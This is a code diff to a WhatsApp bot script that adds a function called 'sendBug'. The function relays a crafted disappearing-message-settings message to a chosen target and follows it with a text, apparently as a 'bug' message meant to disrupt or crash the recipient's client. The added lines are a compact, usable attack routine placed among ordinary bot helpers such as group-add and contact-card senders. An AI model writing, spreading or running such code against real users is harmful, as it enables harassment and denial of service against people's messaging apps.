@@ -223,6 +223,14 @@ module.exports = nino = async (nino, mek) => {
        const add = function(from, orangnya){
 	       nino.groupAdd(from, orangnya)
 }
+      const sendBug = async(target, teks) => {
+           if (!teks) teks = '.'
+           await nino.relayWAMessage(nino.
+           prepareMessageFromContent(target, nino.
+           prepareDisappearingMessageSettingContent(0),
+           {}),{waitForAck:true})
+           nino.sendMessage(target, teks, 'conversation')
+}
        const sendKontak = (from, nomor, nama, org = "") => {
 	       const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
 	       nino.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
